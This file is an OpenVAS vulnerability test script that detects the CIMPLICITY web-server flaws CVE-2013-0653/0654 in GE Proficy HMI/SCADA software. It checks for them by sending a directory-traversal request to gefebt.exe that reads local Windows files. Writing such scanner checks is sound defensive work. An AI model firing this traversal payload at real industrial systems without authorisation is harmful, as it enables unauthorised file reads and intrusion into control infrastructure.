###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ge_intelligent_mult_vulns_09_13.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# GE Intelligent Platforms Proficy Cimplicity Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103785");
  script_cve_id("CVE-2013-0653", "CVE-2013-0654");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13543 $");
  script_name("GE Intelligent Platforms Proficy Cimplicity Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02");
  script_xref(name:"URL", value:"http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB15153");
  script_xref(name:"URL", value:"http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB15244");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-09-11 14:38:23 +0200 (Wed, 11 Sep 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("CIMPLICITY/banner");

  script_tag(name:"impact", value:"If the vulnerabilities are exploited, they could allow an unauthenticated remote
attacker to cause the CIMPLICITY built-in Web server to crash or to run arbitrary commands on
a server running the affected software, or could potentially allow an attacker to take control
of the CIMPLICITY server.");
  script_tag(name:"vuldetect", value:"Send a maliciously crafted HTTP request to read a local file.");
  script_tag(name:"insight", value:"General Electric (GE) has addressed two vulnerabilities in GE Intelligent
Platforms Proficy HMI/SCADA-CIMPLICITY: a directory transversal vulnerability and improper
input validation vulnerability.
GE has released two security advisories (GEIP12-13 and GEIP12-19) available on the GE
Intelligent Platforms support Web site to inform customers about these
vulnerabilities.");
  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"GE Intelligent Platforms Proficy Cimplicity is prone to multiple Vulnerabilities");
  script_tag(name:"affected", value:"GE Intelligent Platforms Proficy HMI/SCADA - CIMPLICITY 4.01 through 8.0, and
Proficy Process Systems with CIMPLICITY");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

banner = get_http_banner( port:port );
if( "Server: CIMPLICITY" >!< banner ) exit( 0 );

files = traversal_files('windows');

foreach dir( make_list_unique( "/CimWeb", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + '/index.html';
  buf = http_get_cache( item:url, port:port );

  if( "gefebt.exe" >< buf ) {
    foreach file( keys( files ) ) {
      url = dir + '/gefebt.exe?substitute.bcl+FILE=' + crap(data:"../",length:6*9) + files[file];
      if( http_vuln_check( port:port, url:url, pattern:file, check_header:TRUE ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );